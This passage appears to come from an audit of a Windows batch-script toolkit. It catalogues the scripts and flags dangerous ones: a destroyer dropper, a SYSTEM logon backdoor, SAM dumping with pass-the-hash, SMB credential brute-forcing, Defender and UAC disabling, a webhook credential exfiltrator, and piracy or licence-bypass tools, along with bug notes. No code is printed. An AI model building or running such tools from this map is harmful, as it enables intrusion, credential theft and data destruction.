- `WDDL.bat` (hidden destroyer dropper), `dsf.bat` (disk filler), `tf.bat` (clock freeze), `uacd.bat` (UAC off), `uta.bat` (logon SYSTEM backdoor), `pc.bat` (SAM dump + RDP + Pass-the-Hash + hashcat), `SMBBruteforcer.bat` (illegal cred brute), `hfb.bat` (HOSTS edit), `busbc.bat` (USB wipe).
- `s32.bat` grants the user **Full** NTFS control over files placed in `C:\Windows\System32`; `add_exclusion.bat` removes Defender scanning from a path.

### 6.4 Piracy / Terms-of-Service circumvention
- `fgrdown.bat` (FitGirl repacks, auto-runs downloaded EXEs), `listviewer.bat`, `cc.bat` (CapCut Pro "free"), `bts.bat` (Spotify ad-block), `vc.bat` (Vencord), `megatemp.bat` (mega mass accounts), `zicrack.bat` (archive crack), `WA.bat` (activation bypass), `Malwarebytes-Premium-Reset.bat` (trial reset).

### 6.5 Plaintext secrets
- `creds.bat` -> `accs.txt` (unencrypted accounts).
- `PrivateFolderManager.bat` -> plaintext password file in `%appdata%`.
- `cm.bat` -> `clipboard_history.txt` (plaintext).
- `isgen2.txt` -> exfiltrates credentials to a Discord webhook.

### 6.6 Notable bugs
| Location | Bug | Effect |
|----------|-----|--------|
| `zicrack.bat` | `if errorlevel 0` (always >=0) | Reports success on first attempt; cracker non-functional. |
| `UPPPE.bat` | `if "%ERRORLEVEL%"="0"` | String compare, not errorlevel test; "Success" message unreliable. |
| `rcmc.bat` | `if ERRORLEVEL 0 echo ... wrong!` | Inverted; prints error on success. |
| `w11.bat` `:revert` | writes Search entry to `tweaks.reg` not `revert.reg` | Search setting not actually reverted. |
| `pinger.bat` | `goto top+-` | Nonexistent label -> script error each ping. |
| `config\tc.bat` line 22 | `BRIGHT_GREEN2=...m"GRADIENT_DISC` | Literal text appended to color var. |
| `taskmanager.bat` | `taskkill /f /t /PID` with no PID | PID-kill path broken. |
| `geek.bat` | - | **Quarantined on disk by Windows Defender** in audited snapshot. |

---

## 7. Update / distribution notes
- `updatelogs.txt` records the "300 commit" re-organization that simplified the categories (the "advanced tools" category was removed, 2024-2026).
- The launcher self-updates by comparing `Files/config/version` to the GitHub raw `version` file.
- Installer/uninstaller are the supported distribution path (`Installer.bat` is an NSIS binary; `Uninstaller.bat` cleans Program Files, System32, and self-deletes).

---

## 8. Quick index of all catalogued scripts
Apps (41): SuperF4, geek, cmd, ps, ps7, pswin7, fastfetch, git, wg, ctt, wintoys, pcm, flux, chrome, bts, firefox, 7z, telegram, mbam, npp, sharex, qbt, pdn, evt, gitd, uwt, rcv, pch, wat, dc, vc, ifv, plt, psm, skl, blip, cc, rdk, adk, w10wr4, rmt.
Danger (8): WDDL, InfoFinder, isg, dsf, tf, uacd, uta, Schnuker\install.
Network (12): iplog, IPGeolocatorDL, pinger, ipv6, ednsc, SMBBruteforcer, wifipasses, stcli, hfb, nsl, trt, IPStealer.
Fixes (5): SSAMBYO, GPEE, BR, IB, db.
Cracks (5): Malwarebytes-Premium-Reset, WA, fgrdown, zicrack, pc.
SysAdmin (14): RAUP, taskmanager, busbc, aap, aig, rcmc, suc, autorespo, sysinfo, hibern, w11, systempropertiesperformance, UPPPE, Apps\ctt.
Utilities (13): PasswordGenerator, URLShortener, fo, ascii, gradients, creds, emv2ae, bfc, rockyou, dflc, mcs, megatemp, PrivateFolderManager.
Fun (3): speak, CommandLineGame, sut.
Support/templates: logo.bat, ini.bat, setup.bat, config\tc.bat, config\tcoff.bat, creds.bat, config.json, ar.txt, isgen.txt, isgen2.txt, rcmcreadme.txt, Installer.bat, Uninstaller.bat, updatelogs.txt.
